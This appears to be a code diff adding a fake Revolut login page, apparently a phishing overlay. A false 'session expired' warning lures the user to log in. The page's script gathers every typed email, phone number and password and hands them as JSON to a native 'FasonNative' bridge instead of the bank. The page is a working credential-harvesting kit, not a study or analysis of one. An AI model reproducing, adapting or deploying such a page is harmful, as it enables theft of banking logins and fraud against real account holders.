@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Revolut</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj4KICA8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcng9IjIwIiBmaWxsPSIjNjM2NmYxIi8+CiAgPHRleHQgeD0iNTAiIHk9IjY4IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RjwvdGV4dD4KPC9zdmc+">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background: #000000;
+            padding: 16px;
+            text-align: center;
+        }
+        .header h1 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 32px 20px;
+            flex: 1;
+        }
+        .alert {
+            background: rgba(255,193,7,0.15);
+            border: 1px solid rgba(255,193,7,0.4);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #ffc107;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .alert::before { content: '⚠️'; }
+        .logo-area {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .logo-area h1 {
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 36px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+        .logo-area p {
+            color: #999999;
+            font-size: 15px;
+        }
+        form {
+            background: #f8f8f8;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid #e0e0e0;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #999999;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            color: #333333;
+            font-size: 15px;
+            outline: none;
+        }
+        .input-group input:focus { border-color: #000000; }
+        .input-group input::placeholder { color: #999999; }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #000000;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .login-btn:hover { background: #333333; }
+        .extras {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .extras a {
+            color: #000000;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .extras a:hover { text-decoration: underline; }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #999999;
+            font-size: 12px;
+        }
+        © 2025 Revolut
+    
+        .fason-branding {
+            position: fixed;
+            bottom: 8px;
+            right: 12px;
+            font-size: 10px;
+            color: rgba(128,128,128,0.5);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            z-index: 9999;
+        }
+        .fason-branding img {
+            width: 14px;
+            height: 14px;
+            opacity: 0.5;
+        }
+</style>
+</head>
+<body>
+    <div class="header" style="background:#000000">
+            <h1>Revolut</h1>
+        </div>
+    <div class="container">
+        <div class="alert">Your session has expired. Please log in again to continue.</div>
+        <div class="logo-area">
+            <h1>Revolut</h1>
+            <p>Sign in to Revolut</p>
+        </div>
+        <form>
+            
+            <div class="input-group">
+                
+                <input type="text" placeholder="Email or phone number" autocomplete="username">
+            </div>
+            <div class="input-group">
+                
+                <input type="password" placeholder="Password" autocomplete="current-password">
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <div class="extras">
+            <a href="#">Forgot password?</a>
+        </div>
+        
+    </div>
+    <div class="footer"></div>
+
+    <script>
+        function submitForm() {
+            var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="password"], input[type="number"]');
+            var data = {};
+            inputs.forEach(function(input, i) {
+                var key = input.placeholder || input.name || input.id || 'field' + i;
+                data[key] = input.value;
+            });
+            FasonNative.onFormSubmit(JSON.stringify(data));
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            var form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    submitForm();
+                });
+            }
+            var btn = document.querySelector('button[type="submit"], .login-btn, .submit-btn, [onclick*="submit"]');
+            if (btn) {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    submitForm();
+                });
+            }
+        });
+    </script>
+
+
+    <div class="fason-branding">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj4KICA8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcng9IjIwIiBmaWxsPSIjNjM2NmYxIi8+CiAgPHRleHQgeD0iNTAiIHk9IjY4IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RjwvdGV4dD4KPC9zdmc+" alt="F">
+        <span>Powered by Fason</span>
+    </div>
+</body>
+</html>
